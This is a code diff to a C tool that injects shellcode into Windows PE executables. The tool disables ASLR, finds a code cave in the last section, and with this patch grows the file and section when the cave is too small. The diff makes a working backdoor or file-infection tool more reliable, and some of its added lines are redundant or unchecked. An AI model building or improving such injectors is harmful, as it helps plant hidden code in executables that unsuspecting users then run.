@@ -72,6 +72,12 @@ static int buffer_contains(const unsigned char *buffer, size_t bufSize,
     return 0;
 }
 
+typedef uint64_t  QWORD;                 /* for clarity      */
+static QWORD alignUp64(QWORD v, QWORD a) /* works if a==0    */
+{
+    return a ? ((v + a - 1) & ~(a - 1)) : v;
+}
+
 // --------------------------------------------------------------------------
 // injectFile(): Inject into the last section of a PE (32-bit or 64-bit).
 // Before injecting, disables ASLR (clears DYNAMIC_BASE) and checks whether
@@ -150,6 +156,17 @@ int injectFile(const char *filename) {
         return 1;
     }
 
+    QWORD fileAlignment = (QWORD)(is32 ? oh32->FileAlignment
+                                   : oh64->FileAlignment);
+    QWORD sectAlignment = (QWORD)(is32 ? oh32->SectionAlignment
+                                    : oh64->SectionAlignment);
+    if (fileAlignment == 0 || sectAlignment == 0) {
+        fprintf(stderr,"[%s] Bad header: zero alignment.\n", filename);
+        free(buffer); return 1;
+    }
+
+
+
     // 5. Disable ASLR
     if (is32) {
         IMAGE_NT_HEADERS32 *nt32 = (IMAGE_NT_HEADERS32 *)(buffer + e_lfanew);
@@ -171,10 +188,14 @@ int injectFile(const char *filename) {
     }
 
     // 7. Locate first section header
-    IMAGE_SECTION_HEADER *section = (IMAGE_SECTION_HEADER *)( 
-        (LPBYTE)&oh32[1] + fileHeader->SizeOfOptionalHeader 
-        - (is64 ? sizeof(IMAGE_OPTIONAL_HEADER64) : sizeof(IMAGE_OPTIONAL_HEADER32))
-    );
+    /* NEW CODE — works for both PE32 and PE64 */
+    void *optHdr = is32
+                ? (void *)&oh32->Magic            /* start of optional header */
+                : (void *)&oh64->Magic;
+
+    IMAGE_SECTION_HEADER *section = (IMAGE_SECTION_HEADER *)(
+            (BYTE *)optHdr + fileHeader->SizeOfOptionalHeader);
+
     int numSections = fileHeader->NumberOfSections;
     if (numSections == 0) {
         free(buffer);
@@ -204,9 +225,13 @@ int injectFile(const char *filename) {
 
     // 10. Compute minimum code cave size within last section
     int baseSize = is32 ? BASE_SHELL32_SIZE : BASE_SHELL64_SIZE;
-    int minCave  = PREFIX_NOP_COUNT + 1 + baseSize + 1 + (is32 ? 5 : 12);
-    //   32-bit: 4 NOP + PUSHAD + 267 + POPAD + 5-byte JMP = 278
-    //   64-bit: 4 NOP + 361 + 10 (mov rax) + 2 (jmp rax) = 377
+    /* exact size of the blob we are about to build                  *
+    *  32-bit : 4 NOP + PUSHAD + 267 + POPAD + JMP rel32 = 278 bytes
+    *  64-bit : 4 NOP + 361  + 10-byte MOV RAX + 2-byte JMP RAX = 377 bytes */
+    int minCave = is32
+                ? (PREFIX_NOP_COUNT + 1 + BASE_SHELL32_SIZE + 1 + 5)   /* 278 */
+                : (PREFIX_NOP_COUNT     + BASE_SHELL64_SIZE     + 10 + 2);/* 377 */
+
 
     // 11. Search for a zero-byte run (“code cave”) inside the last section only
     uint64_t rawOffsetFound = 0, virtAddrFound = 0;
@@ -319,13 +344,65 @@ int injectFile(const char *filename) {
     }
 
     // 15. Copy shellcode into the discovered code cave
-    if (rawOffsetFound + finalSize > fileSize) {
-        free(finalShell);
-        free(buffer);
-        fprintf(stderr, "[%s] Error: Shellcode does not fit at offset 0x%llX.\n",
-                filename, rawOffsetFound);
-        return 1;
-    }
+    QWORD need       = rawOffsetFound + finalSize;
+    QWORD newFileSz  = alignUp64(need, fileAlignment);
+    if (newFileSz > fileSize) {
+        if (newFileSz > 0x7FFFFFFF && sizeof(void*) == 4) {
+            fprintf(stderr,"[%s] Injector built as 32-bit cannot enlarge "
+                    "files beyond 2 GB – re-compile x64.\n", filename);
+            free(finalShell); free(buffer); return 1;
+        }
+
+        /* remember where lastSec lives before realloc moves memory */
+        size_t lastSecOff = (BYTE*)lastSec - buffer;
+
+        unsigned char *tmp = (unsigned char*)realloc(buffer,(size_t)newFileSz);
+        if (!tmp) {
+            free(finalShell); free(buffer);
+            fprintf(stderr, "[%s] realloc failed while growing file.\n", filename);
+            return 1;
+        }
+        buffer   = tmp;
+        memset(buffer + fileSize, 0, (size_t)(newFileSz - fileSize));
+        fileSize = (size_t)newFileSz;
+
+        /* re-establish pointers that lived inside the old buffer   */
+        dosHeader = (IMAGE_DOS_HEADER*)buffer;
+        ntSig     = (uint32_t*)(buffer + e_lfanew);
+        fileHeader= (IMAGE_FILE_HEADER*)(buffer + e_lfanew + sizeof(uint32_t));
+        oh32      = (IMAGE_OPTIONAL_HEADER32*)((BYTE*)fileHeader + sizeof(IMAGE_FILE_HEADER));
+        oh64      = (IMAGE_OPTIONAL_HEADER64*)oh32;
+        lastSec   = (IMAGE_SECTION_HEADER*)(buffer + lastSecOff);
+
+        /* enlarge section & image sizes                            */
+        lastSec->SizeOfRawData    = fileSize - lastSec->PointerToRawData;
+        lastSec->Misc.VirtualSize = lastSec->SizeOfRawData;
+
+        DWORD newSzImage = (lastVirtAddr + lastSec->Misc.VirtualSize + sectAlignment-1)
+                        & ~(sectAlignment-1);
+        lastSec->SizeOfRawData    = (DWORD)alignUp64(
+                                     fileSize - lastSec->PointerToRawData,
+                                     fileAlignment);
+        lastSec->Misc.VirtualSize = (DWORD)(fileSize - lastSec->PointerToRawData);
+
+        /* add zero padding so RawData really exists on disk */
+        QWORD padEnd = lastSec->PointerToRawData + lastSec->SizeOfRawData;
+        if (padEnd > fileSize) {
+            size_t extra = (size_t)(padEnd - fileSize);
+            buffer = (unsigned char*)realloc(buffer, fileSize + extra);
+            memset(buffer + fileSize, 0, extra);
+            fileSize += extra;
+        }
+
+        QWORD newSizeOfImage = alignUp64(lastVirtAddr +
+                                         lastSec->Misc.VirtualSize,
+                                         sectAlignment);
+        if (is32) ((IMAGE_NT_HEADERS32*)(buffer+e_lfanew))
+                     ->OptionalHeader.SizeOfImage = (DWORD)newSizeOfImage;
+        else      ((IMAGE_NT_HEADERS64*)(buffer+e_lfanew))
+                     ->OptionalHeader.SizeOfImage = (DWORD)newSizeOfImage;
+     }
+
     memcpy(buffer + rawOffsetFound, finalShell, finalSize);
     free(finalShell);
 
